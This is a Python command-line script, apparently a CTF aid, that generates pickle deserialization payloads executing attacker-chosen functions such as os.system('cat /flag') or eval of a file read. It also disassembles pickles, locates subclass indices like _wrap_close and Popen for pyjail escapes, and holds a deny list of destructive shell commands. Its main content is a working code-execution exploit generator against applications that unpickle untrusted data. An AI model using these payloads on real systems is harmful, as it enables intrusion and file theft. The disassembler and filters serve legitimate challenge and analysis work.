#!/usr/bin/env python3
"""Python pickle 反序列化 / pyjail：离线生成 pickle payload、反汇编、检查 jail payload。

依赖：纯标准库。--find-index 会在本机起一次解释器（只读，不改任何文件）。
安全：本脚本**从不执行**加载到的 pickle，--dis 只用 pickletools.dis 打印 opcode。

用法：
  python python_pickle.py --pickle-payload --module os --func system --arg 'cat /flag'
  python python_pickle.py --dis 636f 730a 7379 7374 656d 0a
  python python_pickle.py --find-index _wrap_close
  python python_pickle.py --jailcheck --code "().__class__.__base__.__subclasses__()"
  python python_pickle.py --selftest
"""
from __future__ import annotations

import argparse
import io
import json
import pickletools
import re
import subprocess
import sys

MODULE_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_.]*$")
ATTR_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*$")
# 只在题目授权靶场上使用；本脚本自身拒绝删除/提权类参数
BAD_ARG = re.compile(r"(rm\s+-rf|mkfs|dd\s+of=|shutdown|reboot|:\s*\(\s*\)\s*\{)", re.I)

RISKY = [
    ("pickle.loads(", "会执行 GLOBAL/REDUCE，确认输入来源"),
    ("rm -rf", "破坏性命令，题目授权靶场外一律禁"),
    ("sh -c", "子 shell 调用，注意目标 grep 过滤"),
]


def pickle_payload(module: str, func: str, arg: str) -> bytes:
    """协议 0 手工构造：c<module>\\n<name>\\n(<arg>tR. 等价于 module.name(arg)。"""
    if not MODULE_RE.match(module or ""):
        raise ValueError("module 名非法：%r" % (module,))
    if not ATTR_RE.match(func or ""):
        raise ValueError("func 名非法：%r" % (func,))
    if not isinstance(arg, str) or not arg:
        raise ValueError("需要 --arg 且非空")
    if BAD_ARG.search(arg):
        raise ValueError("arg 含破坏性命令片段，本卡拒绝生成：%r" % arg)
    if "\n" in arg or "\r" in arg:
        raise ValueError("arg 含换行，pickle 协议 0 的 S 字符串不支持：%r" % arg)
    esc = arg.replace("\\", "\\\\").replace("'", "\\'")
    return ("c%s\n%s\n(S'%s'\ntR." % (module, func, esc)).encode("utf-8")


def pickle_legacy_payload(module: str, func: str, arg: str) -> bytes:
    """协议 0 的另一种写法：用 S 压字符串、t 组元组（README 里常见的精简形）。"""
    return _legacy(module, func, arg)


def _short_str(s: str) -> bytes:
    esc = s.replace("\\", "\\\\").replace("'", "\\'")
    return ("S'%s'\n" % esc).encode("utf-8")


def _legacy(module: str, func: str, arg: str) -> bytes:
    if not MODULE_RE.match(module or "") or not ATTR_RE.match(func or ""):
        raise ValueError("module/func 名非法")
    if not arg or BAD_ARG.search(arg):
        raise ValueError("arg 为空或含破坏性片段")
    return ("c%s\n%s\n" % (module, func)).encode() + _short_str(arg) + b"tR."


def parse_pickle(hexstr: str, out=None) -> int:
    """反汇编十六进制 pickle（只 dis，不 loads）。返回 opcode 数。"""
    h = "".join(hexstr.split())
    if len(h) % 2:
        raise ValueError("十六进制长度必须为偶数")
    try:
        data = bytes.fromhex(h)
    except ValueError as e:
        raise ValueError("非法十六进制：%s" % e)
    if not data:
        raise ValueError("空输入")
    sink = out if out is not None else sys.stdout
    try:
        buf = io.StringIO()
        pickletools.dis(data, out=buf)
        text = buf.getvalue()
    except Exception as e:  # dis 失败即为非法 pickle
        raise ValueError("不是合法 pickle：%s" % e)
    sink.write(text if text.endswith("\n") else text + "\n")
    return sum(1 for line in text.splitlines() if re.match(r"^\s*\d+:", line))


def find_class_index(names) -> list:
    """在本机解释器里搜 class 名对应的下标（仅本机参考，远端会变）。"""
    if isinstance(names, str):
        names = [names]
    names = [n for n in names if n]
    if not names:
        raise ValueError("需要至少一个类名")
    code = (
        "import json,sys\n"
        "subs=().__class__.__base__.__subclasses__()\n"
        "names=json.loads(sys.argv[1])\n"
        "print(json.dumps([[i,c.__name__,c.__module__] for i,c in enumerate(subs) if c.__name__ in names]))\n"
    )
    p = subprocess.run([sys.executable, "-c", code, json.dumps(names)],
                       capture_output=True, text=True, encoding="utf-8", timeout=30)
    if p.returncode != 0:
        raise RuntimeError("子解释器失败：%s" % (p.stderr or "").strip())
    rows = json.loads(p.stdout.strip() or "[]")
    if not rows:
        raise ValueError("本机未找到这些类：%s（可能已被导入时机影响）" % names)
    return rows


def jail_risky_tokens(code: str) -> list:
    if not code or not code.strip():
        raise ValueError("需要 --code 且非空")
    return [{"token": t, "why": w} for t, w in RISKY if t in code]


def selftest() -> int:
    fails = []

    # 1. 正常路径：协议 0 payload 结构 + 可被 pickletools 解析
    p = pickle_payload("os", "system", "id")
    if p != b"cos\nsystem\n(S'id'\ntR.":
        fails.append("case1: payload 字节不符 %r" % p)
    try:
        list(pickletools.genops(p))
    except Exception as e:
        fails.append("case1: 生成的 payload 不能被 pickletools 解析：%s" % e)
    n = parse_pickle(p.hex(), out=io.StringIO())
    if n < 5:
        fails.append("case1: opcode 数异常 %d" % n)

    # 2. 正常路径：文件读取型 payload + 合法代码安全
    q = pickle_payload("builtins", "eval", "open('/f').read()")
    if b"builtins\neval" not in q:
        fails.append("case2: builtins.eval payload 异常 %r" % q)
    if jail_risky_tokens("print(1+1)"):
        fails.append("case2: 无害代码被误标风险")

    # 3. 边界拒绝：非法模块名 / 破坏性 arg / 非法 hex / 空类名
    for bad in [("os;id", "system", "id"), ("os", "sys tem", "id"), ("os", "system", "")]:
        try:
            pickle_payload(*bad)
            fails.append("case3: 非法参数 %r 未被拒绝" % (bad,))
        except ValueError:
            pass
    try:
        pickle_payload("os", "system", "rm -rf /")
        fails.append("case3: 破坏性 arg 未被拒绝")
    except ValueError:
        pass
    for bad_hex in ["abc", "zz", ""]:
        try:
            parse_pickle(bad_hex, out=io.StringIO())
            fails.append("case3: 非法 hex %r 未被拒绝" % bad_hex)
        except ValueError:
            pass

    # 4. 参数不足：main 无参数必须以退出码 2 结束
    try:
        main([])
        fails.append("case4: 无参数应报参数不足")
    except SystemExit as e:
        if e.code != 2:
            fails.append("case4: 参数不足退出码应 2，实际 %r" % e.code)

    # 5. 本机固定查询：_wrap_close 下标可稳定拿到（同一进程内两次一致）
    try:
        r1 = find_class_index(["_wrap_close", "Popen"])
        r2 = find_class_index(["_wrap_close", "Popen"])
        if r1 != r2:
            fails.append("case5: 两次查询下标不一致")
        if not r1:
            fails.append("case5: 未找到 _wrap_close/Popen")
    except Exception as e:
        fails.append("case5: find_class_index 失败 %s" % e)

    for f in fails:
        print("FAIL %s" % f, file=sys.stderr)
    if fails:
        return 1
    print("selftest ok: 5/5（payload 结构与反汇编、文件读取型、非法参数拒绝、参数不足、下标稳定查询）")
    return 0


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="pickle payload 生成 / 反汇编 / pyjail 检查（离线）")
    ap.add_argument("--pickle-payload", action="store_true")
    ap.add_argument("--module")
    ap.add_argument("--func")
    ap.add_argument("--arg")
    ap.add_argument("--legacy", action="store_true", help="用 S 压字符串的精简写法")
    ap.add_argument("--dis", help="十六进制 pickle，反汇编（不执行）")
    ap.add_argument("--find-index", help="逗号分隔类名，本机查下标")
    ap.add_argument("--jailcheck", action="store_true")
    ap.add_argument("--code")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--selftest", action="store_true")
    args = ap.parse_args(argv)

    if args.selftest:
        return selftest()
    try:
        if args.pickle_payload:
            if not (args.module and args.func and args.arg):
                ap.error("--pickle-payload 需要 --module --func --arg")
            data = _legacy(args.module, args.func, args.arg) if args.legacy else pickle_payload(
                args.module, args.func, args.arg)
            if args.json:
                print(json.dumps({"hex": data.hex(), "repr": repr(data)}, ensure_ascii=False))
            else:
                print(repr(data))
            return 0
        if args.dis:
            n = parse_pickle(args.dis)
            print("opcode 数：%d" % n, file=sys.stderr)
            return 0
        if args.find_index:
            rows = find_class_index([x.strip() for x in args.find_index.split(",") if x.strip()])
            if args.json:
                print(json.dumps(rows, ensure_ascii=False))
            else:
                for i, name, mod in rows:
                    print("下标 %-4d %-16s %s  ← 远端需重测" % (i, name, mod))
            return 0
        if args.jailcheck:
            hits = jail_risky_tokens(args.code or "")
            if args.json:
                print(json.dumps(hits, ensure_ascii=False))
            else:
                print("未发现高风险片段" if not hits else "\n".join(
                    "- %s：%s" % (h["token"], h["why"]) for h in hits))
            return 0
    except (ValueError, RuntimeError) as e:
        print("错误：%s" % e, file=sys.stderr)
        return 2
    ap.error("需要 --pickle-payload / --dis / --find-index / --jailcheck 之一，或用 --selftest")
    return 2


if __name__ == "__main__":
    sys.exit(main())
